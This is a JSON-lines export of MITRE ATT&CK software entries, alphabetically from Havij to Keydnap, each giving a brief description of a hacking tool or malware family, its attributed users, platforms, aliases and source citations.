{"ID":"S0224","name":"Havij","description":"[Havij](https://attack.mitre.org/software/S0224) is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. (Citation: Check Point Havij Analysis)","url":"https://attack.mitre.org/software/S0224","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Check Point Rocket Kitten),,(Citation: Check Point Havij Analysis)"}
{"ID":"S0170","name":"Helminth","description":"[Helminth](https://attack.mitre.org/software/S0170) is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable. (Citation: Palo Alto OilRig May 2016)","url":"https://attack.mitre.org/software/S0170","created":"16 January 2018","last modified":"28 March 2020","version":"1.1","contributors":"Robert Falcone","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Palo Alto OilRig May 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Crowdstrike Helix Kitten Nov 2018),,(Citation: Unit 42 Playbook Dec 2017),(Citation: ClearSky OilRig Jan 2017),(Citation: Palo Alto OilRig May 2016)"}
{"ID":"S0697","name":"HermeticWiper","description":"[HermeticWiper](https://attack.mitre.org/software/S0697) is a data wiper that has been used since at least early 2022, primarily against Ukraine with additional activity observed in Latvia and Lithuania. Some sectors targeted include government, financial, defense, aviation, and IT services.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022)","url":"https://attack.mitre.org/software/S0697","created":"25 March 2022","last modified":"18 October 2022","version":"1.0","contributors":"Harshal Tupsamudre, Qualys; Mayuresh Dani, Qualys","platforms":"Windows","aliases":"DriveSlayer, Trojan.Killdisk","type":"malware","relationship citations":",,(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Symantec Ukraine Wipers February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: ESET Hermetic Wiper February 2022)"}
{"ID":"S0698","name":"HermeticWizard","description":"[HermeticWizard](https://attack.mitre.org/software/S0698) is a worm that has been used to spread [HermeticWiper](https://attack.mitre.org/software/S0697) in attacks against organizations in Ukraine since at least 2022.(Citation: ESET Hermetic Wizard March 2022)","url":"https://attack.mitre.org/software/S0698","created":"25 March 2022","last modified":"11 April 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET Hermetic Wizard March 2022)"}
{"ID":"S1027","name":"Heyoka Backdoor","description":"[Heyoka Backdoor](https://attack.mitre.org/software/S1027) is a custom backdoor--based on the Heyoka open source exfiltration tool--that  has been used by [Aoqin Dragon](https://attack.mitre.org/groups/G1007) since at least 2013.(Citation: SentinelOne Aoqin Dragon June 2022)(Citation: Sourceforge Heyoka 2022) ","url":"https://attack.mitre.org/software/S1027","created":"25 July 2022","last modified":"24 October 2022","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: SentinelOne Aoqin Dragon June 2022),,(Citation: SentinelOne Aoqin Dragon June 2022)"}
{"ID":"S0087","name":"Hi-Zor","description":"[Hi-Zor](https://attack.mitre.org/software/S0087) is a remote access tool (RAT) that has characteristics similar to [Sakula](https://attack.mitre.org/software/S0074). It was used in a campaign named INOCNATION. (Citation: Fidelis Hi-Zor)","url":"https://attack.mitre.org/software/S0087","created":"31 May 2017","last modified":"09 February 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Fidelis Hi-Zor),(Citation: Fidelis INOCNATION)"}
{"ID":"S0394","name":"HiddenWasp","description":"[HiddenWasp](https://attack.mitre.org/software/S0394) is a Linux-based Trojan used to target systems for remote control. It comes in the form of a statically linked ELF binary with stdlibc++.(Citation: Intezer HiddenWasp Map 2019)","url":"https://attack.mitre.org/software/S0394","created":"24 June 2019","last modified":"23 April 2021","version":"1.2","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Intezer HiddenWasp Map 2019)"}
{"ID":"S0009","name":"Hikit","description":"[Hikit](https://attack.mitre.org/software/S0009) is malware that has been used by [Axiom](https://attack.mitre.org/groups/G0001) for late-stage persistence and exfiltration after the initial compromise.(Citation: Novetta-Axiom)(Citation: FireEye Hikit Rootkit)","url":"https://attack.mitre.org/software/S0009","created":"31 May 2017","last modified":"20 March 2023","version":"1.3","contributors":"Christopher Glyer, Mandiant, @cglyer","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: Novetta-Axiom),,(Citation: FireEye Hikit Rootkit),(Citation: FireEye HIKIT Rootkit Part 2),(Citation: Novetta-Axiom)"}
{"ID":"S0601","name":"Hildegard","description":"[Hildegard](https://attack.mitre.org/software/S0601) is malware that targets misconfigured kubelets for initial access and runs cryptocurrency miner operations. The malware was first observed in January 2021. The TeamTNT activity group is believed to be behind [Hildegard](https://attack.mitre.org/software/S0601). (Citation: Unit 42 Hildegard Malware)","url":"https://attack.mitre.org/software/S0601","created":"07 April 2021","last modified":"16 October 2021","version":"1.1","contributors":"Center for Threat-Informed Defense (CTID)","platforms":"Containers, IaaS, Linux","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 Hildegard Malware),,(Citation: Unit 42 Hildegard Malware)"}
{"ID":"S0431","name":"HotCroissant","description":"[HotCroissant](https://attack.mitre.org/software/S0431) is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA.(Citation: US-CERT HOTCROISSANT February 2020) [HotCroissant](https://attack.mitre.org/software/S0431) shares numerous code similarities with [Rifdoor](https://attack.mitre.org/software/S0433).(Citation: Carbon Black HotCroissant April 2020)","url":"https://attack.mitre.org/software/S0431","created":"01 May 2020","last modified":"06 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT HOTCROISSANT February 2020),,(Citation: Carbon Black HotCroissant April 2020),(Citation: US-CERT HOTCROISSANT February 2020)"}
{"ID":"S0203","name":"Hydraq","description":"[Hydraq](https://attack.mitre.org/software/S0203) is a data-theft trojan first used by [Elderwood](https://attack.mitre.org/groups/G0066) in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including [APT17](https://attack.mitre.org/groups/G0025).(Citation: MicroFocus 9002 Aug 2016)(Citation: Symantec Elderwood Sept 2012)(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: ASERT Seven Pointed Dagger Aug 2015)(Citation: FireEye DeputyDog 9002 November 2013)(Citation: ProofPoint GoT 9002 Aug 2017)(Citation: FireEye Sunshop Campaign May 2013)(Citation: PaloAlto 3102 Sept 2015)","url":"https://attack.mitre.org/software/S0203","created":"18 April 2018","last modified":"20 March 2023","version":"2.0","contributors":null,"platforms":"Windows","aliases":"9002 RAT, Aurora, HidraQ, HomeUnix, Homux, HydraQ, McRat, MdmBot, Roarur","type":"malware","relationship citations":"(Citation: Cisco Group 72),(Citation: Novetta-Axiom),(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: Symantec Hydraq Jan 2010),(Citation: Symantec Elderwood Sept 2012)"}
{"ID":"S0398","name":"HyperBro","description":"[HyperBro](https://attack.mitre.org/software/S0398) is a custom in-memory backdoor used by [Threat Group-3390](https://attack.mitre.org/groups/G0027).(Citation: Unit42 Emissary Panda May 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)","url":"https://attack.mitre.org/software/S0398","created":"09 July 2019","last modified":"29 November 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Securelist LuckyMouse June 2018),(Citation: Hacker News LuckyMouse June 2018),(Citation: Unit42 Emissary Panda May 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Trend Micro DRBControl February 2020),,(Citation: Unit42 Emissary Panda May 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Trend Micro DRBControl February 2020)"}
{"ID":"S0537","name":"HyperStack","description":"[HyperStack](https://attack.mitre.org/software/S0537) is a RPC-based backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2018. [HyperStack](https://attack.mitre.org/software/S0537) has similarities to other backdoors used by [Turla](https://attack.mitre.org/groups/G0010) including [Carbon](https://attack.mitre.org/software/S0335).(Citation: Accenture HyperStack October 2020)","url":"https://attack.mitre.org/software/S0537","created":"02 December 2020","last modified":"04 December 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Accenture HyperStack October 2020),,(Citation: Accenture HyperStack October 2020)"}
{"ID":"S0189","name":"ISMInjector","description":"[ISMInjector](https://attack.mitre.org/software/S0189) is a Trojan used to install another [OilRig](https://attack.mitre.org/groups/G0049) backdoor, ISMAgent. (Citation: OilRig New Delivery Oct 2017)","url":"https://attack.mitre.org/software/S0189","created":"16 January 2018","last modified":"31 March 2020","version":"1.1","contributors":"Robert Falcone","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: OilRig New Delivery Oct 2017),,(Citation: OilRig New Delivery Oct 2017)"}
{"ID":"S1022","name":"IceApple","description":"[IceApple](https://attack.mitre.org/software/S1022) is a modular Internet Information Services (IIS) post-exploitation framework, that has been used since at least 2021 against the technology, academic, and government sectors.(Citation: CrowdStrike IceApple May 2022)","url":"https://attack.mitre.org/software/S1022","created":"27 June 2022","last modified":"22 March 2023","version":"1.1","contributors":"Raphaël Lheureux","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: CrowdStrike IceApple May 2022)"}
{"ID":"S0483","name":"IcedID","description":"[IcedID](https://attack.mitre.org/software/S0483) is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.  [IcedID](https://attack.mitre.org/software/S0483)  has been downloaded by [Emotet](https://attack.mitre.org/software/S0367) in multiple campaigns.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020)","url":"https://attack.mitre.org/software/S0483","created":"15 July 2020","last modified":"14 August 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks GOLD CABIN),(Citation: Unit 42 TA551 Jan 2021),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Valak May 2020),,(Citation: Juniper IcedID June 2020),(Citation: IBM IcedID November 2017)"}
{"ID":"S0434","name":"Imminent Monitor","description":"[Imminent Monitor](https://attack.mitre.org/software/S0434) was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.(Citation: Imminent Unit42 Dec2019)","url":"https://attack.mitre.org/software/S0434","created":"05 May 2020","last modified":"10 July 2020","version":"1.0","contributors":"Jose Luis Sánchez Martinez","platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: QiAnXin APT-C-36 Feb2019),,(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Imminent Unit42 Dec2019)"}
{"ID":"S0357","name":"Impacket","description":"[Impacket](https://attack.mitre.org/software/S0357) is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. [Impacket](https://attack.mitre.org/software/S0357) contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.(Citation: Impacket Tools)","url":"https://attack.mitre.org/software/S0357","created":"31 January 2019","last modified":"23 January 2023","version":"1.4","contributors":"Jacob Wilkin, Trustwave, SpiderLabs","platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: DFIR Phosphorus November 2021),(Citation: Core Security Impacket),(Citation: Microsoft Prestige ransomware October 2022),(Citation: US-CERT TA18-074A),(Citation: Bitdefender FIN8 July 2021),(Citation: Unit42 Emissary Panda May 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Tarrask scheduled task),(Citation: FoxIT Wocao December 2019),(Citation: Impacket Tools)"}
{"ID":"S0604","name":"Industroyer","description":"[Industroyer](https://attack.mitre.org/software/S0604) is a sophisticated malware framework designed to cause an impact to the working processes of Industrial Control Systems (ICS), specifically components used in electrical substations.(Citation: ESET Industroyer) [Industroyer](https://attack.mitre.org/software/S0604) was used in the attacks on the Ukrainian power grid in December 2016.(Citation: Dragos Crashoverride 2017) This is the first publicly known malware specifically designed to target and impact operations in the electric grid.(Citation: Dragos Crashoverride 2018)","url":"https://attack.mitre.org/software/S0604","created":"04 January 2021","last modified":"20 October 2022","version":"1.1","contributors":"Dragos  Threat  Intelligence; Joe Slowik -  Dragos","platforms":"Windows","aliases":"CRASHOVERRIDE, Win32/Industroyer","type":"malware","relationship citations":"(Citation: ESET Industroyer),(Citation: Dragos Crashoverride 2018),(Citation: Dragos Crashoverride 2017),(Citation: Secureworks IRON VIKING),(Citation: ESET Industroyer),(Citation: Dragos Crashoverride 2018),(Citation: ESET Industroyer),(Citation: Dragos Crashoverride 2017)"}
{"ID":"S1072","name":"Industroyer2","description":"[Industroyer2](https://attack.mitre.org/software/S1072) is a compiled and static piece of malware that has the ability to communicate over the IEC-104 protocol. It is similar to the IEC-104 module found in [Industroyer](https://attack.mitre.org/software/S0604). Security researchers assess that [Industroyer2](https://attack.mitre.org/software/S1072) was designed to cause impact to high-voltage electrical substations. The initial [Industroyer2](https://attack.mitre.org/software/S1072) sample was compiled on 03/23/2022 and scheduled to execute on 04/08/2022, however it was discovered before deploying, resulting in no impact.(Citation: Industroyer2 Blackhat ESET)","url":"https://attack.mitre.org/software/S1072","created":"30 March 2023","last modified":"06 April 2023","version":"1.0","contributors":null,"platforms":"Engineering Workstation, Field Controller/RTU/PLC/IED","aliases":null,"type":"malware","relationship citations":"(Citation: Industroyer2 ESET April 2022),,(Citation: Industroyer2 Mandiant April 2022)"}
{"ID":"S0259","name":"InnaputRAT","description":"[InnaputRAT](https://attack.mitre.org/software/S0259) is a remote access tool that can exfiltrate files from a victim’s machine. [InnaputRAT](https://attack.mitre.org/software/S0259) has been seen out in the wild since 2016. (Citation: ASERT InnaputRAT April 2018)","url":"https://attack.mitre.org/software/S0259","created":"17 October 2018","last modified":"20 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ASERT InnaputRAT April 2018)"}
{"ID":"S0260","name":"InvisiMole","description":"[InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been used by the InvisiMole Group since at least 2013. [InvisiMole](https://attack.mitre.org/software/S0260) has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities. It has been discovered on compromised victims in the Ukraine and Russia. [Gamaredon Group](https://attack.mitre.org/groups/G0047) infrastructure has been used to download and execute [InvisiMole](https://attack.mitre.org/software/S0260) against a small number of victims.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020)","url":"https://attack.mitre.org/software/S0260","created":"17 October 2018","last modified":"29 November 2021","version":"2.1","contributors":"ESET","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018)"}
{"ID":"S0231","name":"Invoke-PSImage","description":"[Invoke-PSImage](https://attack.mitre.org/software/S0231) takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. (Citation: GitHub Invoke-PSImage)","url":"https://attack.mitre.org/software/S0231","created":"18 April 2018","last modified":"18 October 2022","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),,(Citation: GitHub PSImage),(Citation: GitHub Invoke-PSImage)"}
{"ID":"S0581","name":"IronNetInjector","description":"[IronNetInjector](https://attack.mitre.org/software/S0581) is a [Turla](https://attack.mitre.org/groups/G0010) toolchain that utilizes scripts from the open-source IronPython implementation of Python with a .NET injector to drop one or more payloads including [ComRAT](https://attack.mitre.org/software/S0126).(Citation: Unit 42 IronNetInjector February 2021 )","url":"https://attack.mitre.org/software/S0581","created":"24 February 2021","last modified":"20 May 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Unit 42 IronNetInjector February 2021 ),,(Citation: Unit 42 IronNetInjector February 2021 )"}
{"ID":"S0015","name":"Ixeshe","description":"[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since at least 2009 against targets in East Asia. (Citation: Moran 2013)","url":"https://attack.mitre.org/software/S0015","created":"31 May 2017","last modified":"20 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Moran 2014),(Citation: Moran 2013),,(Citation: Trend Micro IXESHE 2012),(Citation: Moran 2013)"}
{"ID":"S0389","name":"JCry","description":"[JCry](https://attack.mitre.org/software/S0389) is ransomware written in Go. It was identified as apart of the #OpJerusalem 2019 campaign.(Citation: Carbon Black JCry May 2019)","url":"https://attack.mitre.org/software/S0389","created":"18 June 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: Carbon Black JCry May 2019)"}
{"ID":"S0044","name":"JHUHUGIT","description":"[JHUHUGIT](https://attack.mitre.org/software/S0044) is malware used by [APT28](https://attack.mitre.org/groups/G0007). It is based on Carberp source code and serves as reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy 2015) (Citation: ESET Sednit Part 1) (Citation: FireEye APT28 January 2017)","url":"https://attack.mitre.org/software/S0044","created":"31 May 2017","last modified":"30 March 2020","version":"2.1","contributors":null,"platforms":"Windows","aliases":"GAMEFISH, JKEYSKW, Sednit, Seduploader, SofacyCarberp, Trojan.Sofacy","type":"malware","relationship citations":"(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: FireEye APT28 January 2017),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: Kaspersky Sofacy),,(Citation: Unit 42 Playbook Dec 2017),(Citation: Unit 42 Sofacy Feb 2018),(Citation: ESET Sednit Part 1),(Citation: Talos Seduploader Oct 2017),(Citation: F-Secure Sofacy 2015),(Citation: ESET Sednit July 2015)"}
{"ID":"S0201","name":"JPIN","description":"[JPIN](https://attack.mitre.org/software/S0201) is a custom-built backdoor family used by [PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers of [JPIN](https://attack.mitre.org/software/S0201) and [Dipsind](https://attack.mitre.org/software/S0200) code bases were related in some way. (Citation: Microsoft PLATINUM April 2016)","url":"https://attack.mitre.org/software/S0201","created":"18 April 2018","last modified":"11 August 2020","version":"1.1","contributors":"Ryan Becwar","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft PLATINUM April 2016),,(Citation: Microsoft PLATINUM April 2016)"}
{"ID":"S0648","name":"JSS Loader","description":"[JSS Loader](https://attack.mitre.org/software/S0648) is Remote Access Trojan (RAT) with .NET and C++ variants that has been used by [FIN7](https://attack.mitre.org/groups/G0046) since at least 2020.(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021)","url":"https://attack.mitre.org/software/S0648","created":"22 September 2021","last modified":"15 October 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),,(Citation: CrowdStrike Carbon Spider August 2021),(Citation: eSentire FIN7 July 2021)"}
{"ID":"S0163","name":"Janicab","description":"[Janicab](https://attack.mitre.org/software/S0163) is an OS X trojan that relied on a valid developer ID and oblivious users to install it. (Citation: Janicab)","url":"https://attack.mitre.org/software/S0163","created":"14 December 2017","last modified":"19 March 2020","version":"1.1","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: Janicab),(Citation: f-secure janicab)"}
{"ID":"S0528","name":"Javali","description":"[Javali](https://attack.mitre.org/software/S0528) is a banking trojan that has targeted Portuguese and Spanish-speaking countries since 2017, primarily focusing on customers of financial institutions in Brazil and Mexico.(Citation: Securelist Brazilian Banking Malware July 2020)","url":"https://attack.mitre.org/software/S0528","created":"09 November 2020","last modified":"22 December 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Securelist Brazilian Banking Malware July 2020)"}
{"ID":"S0215","name":"KARAE","description":"[KARAE](https://attack.mitre.org/software/S0215) is a backdoor typically used by [APT37](https://attack.mitre.org/groups/G0067) as first-stage malware. (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0215","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
{"ID":"S0271","name":"KEYMARBLE","description":"[KEYMARBLE](https://attack.mitre.org/software/S0271) is a Trojan that has reportedly been used by the North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018)","url":"https://attack.mitre.org/software/S0271","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT KEYMARBLE Aug 2018),,(Citation: US-CERT KEYMARBLE Aug 2018)"}
{"ID":"S1051","name":"KEYPLUG","description":"[KEYPLUG](https://attack.mitre.org/software/S1051) is a modular backdoor written in C++, with Windows and Linux variants, that has been used by [APT41](https://attack.mitre.org/groups/G0096) since at least June 2021.(Citation: Mandiant APT41)","url":"https://attack.mitre.org/software/S1051","created":"12 December 2022","last modified":"12 December 2022","version":"1.0","contributors":null,"platforms":"Linux, Windows","aliases":"KEYPLUG.LINUX","type":"malware","relationship citations":"(Citation: Mandiant APT41),(Citation: Mandiant APT41),(Citation: Mandiant APT41)"}
{"ID":"S0526","name":"KGH_SPY","description":"[KGH_SPY](https://attack.mitre.org/software/S0526) is a modular suite of tools used by [Kimsuky](https://attack.mitre.org/groups/G0094) for reconnaissance, information stealing, and backdoor capabilities. [KGH_SPY](https://attack.mitre.org/software/S0526) derived its name from PDB paths and internal names found in samples containing \"KGH\".(Citation: Cybereason Kimsuky November 2020)","url":"https://attack.mitre.org/software/S0526","created":"06 November 2020","last modified":"22 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cybereason Kimsuky November 2020),,(Citation: Cybereason Kimsuky November 2020)"}
{"ID":"S0669","name":"KOCTOPUS","description":"[KOCTOPUS](https://attack.mitre.org/software/S0669)'s batch variant is loader used by [LazyScripter](https://attack.mitre.org/groups/G0140) since 2018 to launch [Octopus](https://attack.mitre.org/software/S0340) and [Koadic](https://attack.mitre.org/software/S0250) and, in some cases, [QuasarRAT](https://attack.mitre.org/software/S0262). [KOCTOPUS](https://attack.mitre.org/software/S0669) also has a VBA variant that has the same functionality as the batch version.(Citation: MalwareBytes LazyScripter Feb 2021)","url":"https://attack.mitre.org/software/S0669","created":"06 December 2021","last modified":"22 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: MalwareBytes LazyScripter Feb 2021),,(Citation: MalwareBytes LazyScripter Feb 2021)"}
{"ID":"S0156","name":"KOMPROGO","description":"[KOMPROGO](https://attack.mitre.org/software/S0156) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050) that is capable of process, file, and registry management. (Citation: FireEye APT32 May 2017)","url":"https://attack.mitre.org/software/S0156","created":"14 December 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT32 May 2017),,(Citation: FireEye APT32 May 2017)"}
{"ID":"S0356","name":"KONNI","description":"[KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers assess has been used by North Korean cyber actors since at least 2014. [KONNI](https://attack.mitre.org/software/S0356) has significant code overlap with the [NOKKI](https://attack.mitre.org/software/S0353) malware family, and has been linked to several suspected North Korean campaigns targeting political organizations in Russia, East Asia, Europe and the Middle East; there is some evidence potentially linking [KONNI](https://attack.mitre.org/software/S0356) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Talos Konni May 2017)(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021)","url":"https://attack.mitre.org/software/S0356","created":"31 January 2019","last modified":"13 April 2022","version":"2.0","contributors":"Doron Karmi, @DoronKarmi","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Talos Konni May 2017),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Medium KONNI Jan 2020)"}
{"ID":"S0088","name":"Kasidet","description":"[Kasidet](https://attack.mitre.org/software/S0088) is a backdoor that has been dropped by using malicious VBA macros. (Citation: Zscaler Kasidet)","url":"https://attack.mitre.org/software/S0088","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Zscaler Kasidet),(Citation: Microsoft Kasidet)"}
{"ID":"S0265","name":"Kazuar","description":"[Kazuar](https://attack.mitre.org/software/S0265) is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework. (Citation: Unit 42 Kazuar May 2017)","url":"https://attack.mitre.org/software/S0265","created":"17 October 2018","last modified":"02 December 2020","version":"1.3","contributors":null,"platforms":"Windows, macOS","aliases":null,"type":"malware","relationship citations":"(Citation: Talos TinyTurla September 2021),(Citation: Unit 42 Kazuar May 2017),,(Citation: Unit 42 Kazuar May 2017),(Citation: Accenture HyperStack October 2020)"}
{"ID":"S0585","name":"Kerrdown","description":"[Kerrdown](https://attack.mitre.org/software/S0585) is a custom downloader that has been used by [APT32](https://attack.mitre.org/groups/G0050) since at least 2018 to install spyware from a server on the victim's network.(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Unit 42 KerrDown February 2019)","url":"https://attack.mitre.org/software/S0585","created":"02 March 2021","last modified":"15 October 2021","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit 42 KerrDown February 2019),,(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit 42 KerrDown February 2019)"}
{"ID":"S0487","name":"Kessel","description":"[Kessel](https://attack.mitre.org/software/S0487) is an advanced version of OpenSSH which acts as a custom backdoor, mainly acting to steal credentials and function as a bot. [Kessel](https://attack.mitre.org/software/S0487) has been active since its C2 domain began resolving in August 2018.(Citation: ESET ForSSHe December 2018)","url":"https://attack.mitre.org/software/S0487","created":"16 July 2020","last modified":"10 August 2020","version":"1.0","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET ForSSHe December 2018)"}
{"ID":"S1020","name":"Kevin","description":"[Kevin](https://attack.mitre.org/software/S1020) is a backdoor implant written in C++ that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2020, including in operations against organizations in Tunisia.(Citation: Kaspersky Lyceum October 2021)","url":"https://attack.mitre.org/software/S1020","created":"14 June 2022","last modified":"31 August 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Lyceum October 2021),,(Citation: Kaspersky Lyceum October 2021)"}
{"ID":"S0387","name":"KeyBoy","description":"[KeyBoy](https://attack.mitre.org/software/S0387) is malware that has been used in targeted campaigns against members of the Tibetan Parliament in 2016.(Citation: CitizenLab KeyBoy Nov 2016)(Citation: PWC KeyBoys Feb 2017)","url":"https://attack.mitre.org/software/S0387","created":"14 June 2019","last modified":"23 March 2023","version":"1.2","contributors":"Bart Parys","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: CitizenLab Tropic Trooper Aug 2018),,(Citation: PWC KeyBoys Feb 2017),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Rapid7 KeyBoy Jun 2013)"}
{"ID":"S0276","name":"Keydnap","description":"This piece of malware steals the content of the user's keychain while maintaining a permanent backdoor  (Citation: OSX Keydnap malware).","url":"https://attack.mitre.org/software/S0276","created":"17 October 2018","last modified":"17 October 2021","version":"1.2","contributors":null,"platforms":"macOS","aliases":"OSX/Keydnap","type":"malware","relationship citations":",,(Citation: synack 2016 review),(Citation: OSX Keydnap malware)"}
